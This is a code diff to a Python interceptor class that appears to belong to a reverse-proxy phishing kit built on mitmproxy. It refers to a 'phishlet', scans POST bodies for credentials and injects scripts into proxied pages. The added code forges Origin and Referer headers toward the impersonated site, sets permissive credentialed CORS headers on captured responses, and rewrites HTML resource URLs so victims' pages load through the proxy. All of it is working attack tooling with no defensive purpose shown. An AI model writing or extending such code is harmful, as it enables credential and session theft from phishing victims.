@@ -125,10 +125,17 @@ class VantaInterceptor:
                             new_path = "/" + new_path
                         flow.request.path = new_path
                         flow.request.host = br.target_host
+                        # Shape Origin/Referer for upstream service expectations
+                        try:
+                            flow.request.headers["origin"] = f"https://{br.target_host}"
+                            flow.request.headers["referer"] = f"https://{br.target_host}{new_path}"
+                        except Exception:
+                            pass
                         try:
                             if not hasattr(flow, "metadata"):
                                 flow.metadata = {}
                             flow.metadata["v_tgt_host"] = br.target_host
+                            flow.metadata["v_bridge"] = True
                         except Exception:
                             pass
                         break
@@ -237,6 +244,18 @@ class VantaInterceptor:
         # 3. Inject Content
         if flow.response.content:
             self._inject_scripts(flow)
+        # 3b. CORS fallback patch (for non-bridged cross-origin captured responses)
+        try:
+            req_origin = flow.request.headers.get("origin")
+            if req_origin and "access-control-allow-origin" not in flow.response.headers:
+                flow.response.headers["access-control-allow-origin"] = req_origin
+                flow.response.headers["access-control-allow-credentials"] = "true"
+                if "access-control-allow-headers" not in flow.response.headers:
+                    flow.response.headers["access-control-allow-headers"] = "Authorization,Content-Type,Accept,Origin,Referer,User-Agent"
+                if "access-control-allow-methods" not in flow.response.headers:
+                    flow.response.headers["access-control-allow-methods"] = "GET,POST,OPTIONS,PUT,DELETE"
+        except Exception:
+            pass
 
     def _scan_for_credentials(self, flow: http.HTTPFlow):
         """Analyze POST body for defined credential fields"""
@@ -264,6 +283,19 @@ class VantaInterceptor:
 
     def _inject_scripts(self, flow: http.HTTPFlow):
         if "text/html" in flow.response.headers.get("content-type", ""):
+            # HTML static URL rewrite for bridges (script/link/img absolute URLs)
+            try:
+                import re as _re
+                for b in getattr(self.phishlet, "bridges", []):
+                    host = _re.escape(b.target_host)
+                    pfx = b.prefix
+                    if not pfx.endswith("/"):
+                        pfx = pfx + "/"
+                    # Protocol-absolute and https absolute
+                    flow.response.text = _re.sub(r'((?:src|href)=["\'])https?://'+host+r'/', r'\1'+pfx, flow.response.text)
+                    flow.response.text = _re.sub(r'((?:src|href)=["\'])//'+host+r'/', r'\1'+pfx, flow.response.text)
+            except Exception:
+                pass
             # Dynamic bridge injection: reroute fetch/XHR for specified host(s) to local prefixes
             try:
                 bridges = getattr(self.phishlet, "bridges", [])
